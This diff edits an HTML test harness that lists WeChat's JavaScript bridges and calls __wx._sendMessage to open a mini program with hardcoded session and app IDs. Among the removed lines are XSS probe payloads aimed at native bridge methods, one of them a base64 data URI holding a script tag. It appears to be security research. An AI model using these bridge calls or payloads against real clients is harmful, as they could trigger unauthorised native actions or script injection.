@@ -1,6 +1,7 @@
+<html>
 <body>
 	<pre id='log'></pre>
-	<script src="./wxjs.js"></script>
+	<comment><script src="./wxjs.js"></script></comment>
 	<script>
 		function mylog(string) {
 		  	var log = document.getElementById('log');
@@ -8,14 +9,8 @@
 		    		log.innerText += string+'\n';
 		  	}
 		}
-	</script>  
-  <a href="javascript:WeixinJSContext.allocEmpty()" onclick="leak()">CLICK</a>
-  <a href="javascript:xwebToNative.onVideoError(1, '<script>alert(1);</script>')">onVideoError</a>
-  <a href="javascript:xwebToNative.onVideoEnterFullscreen(false, 0, 0, 0, false, false, 0, 0, [])">onVideoEnterFullscreen</a>
-  <a href="javascript:xwebToNative.onVideoGetFrame(0, 0, 'data:image/png;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==')">onVideoGetFrame</a>
-  <a href="javascript:WeixinJSBridge.call('alert(1)', {}, 'function x() { alert(2); }')">call TEST</a>
-
-  <script>
+	</script>
+	<script>
   	window.addEventListener('load', function(event) {
   		mylog("[+] Printing Javascript-bridges available");
   		if(typeof window.WeixinJSBridge !== 'undefined') mylog('WeixinJSBridge');
@@ -24,32 +19,30 @@
 		if(typeof window.__wx !== 'undefined') mylog('__wx');
     	if(typeof window.__wxtag !== 'undefined') mylog('__wxtag');
 
-    	setTimeout(()=> {
-			window.__wx._sendMessage(JSON.stringify({
-				"func": "openWeAppPage",
-				"params": {
-					"scene":73,
-					"sessionId":"6998359142851435608",
-					"userName":"gh_ed9c404e9686@app",
-					"relativeURL":"",
-					"docId":"",
-					"subScene":"",
-					"cookie":"",
-					"debugMode":0,
-					"appVersion":"65",
-					"appID":"wxd250b48686d39ba3",
-					"btn":"여는 중",
-					"desc":"n3PWJUApljTZa0J",
-					"jumpType":2,
-					"nickName":"全民狙神",
-					"tip":""全民狙神" 미니 프로그램의 콘텐츠",
-					"weappUrl":""
-				},
-				"__msg_type":"call",
-				"__callback_id":"1026"	
-			}));
-	},
-	3000);
-  });
+		window.__wx._sendMessage(JSON.stringify({
+			"func": "openWeAppPage",
+			"params": {
+				"scene":73,
+				"sessionId":"6998359142851435608",
+				"userName":"gh_ed9c404e9686@app",
+				"relativeURL":"",
+				"docId":"",
+				"subScene":"",
+				"cookie":"",
+				"debugMode":0,
+				"appVersion":"65",
+				"appID":"wxd250b48686d39ba3",
+				"btn":"여는 중",
+				"desc":"n3PWJUApljTZa0J",
+				"jumpType":2,
+				"nickName":"全民狙神",
+				"tip":""全民狙神" 미니 프로그램의 콘텐츠",
+				"weappUrl":""
+			},
+			"__msg_type":"call",
+			"__callback_id":"1026"	
+		}));
+  	});
   </script>
 </body>
+</html>
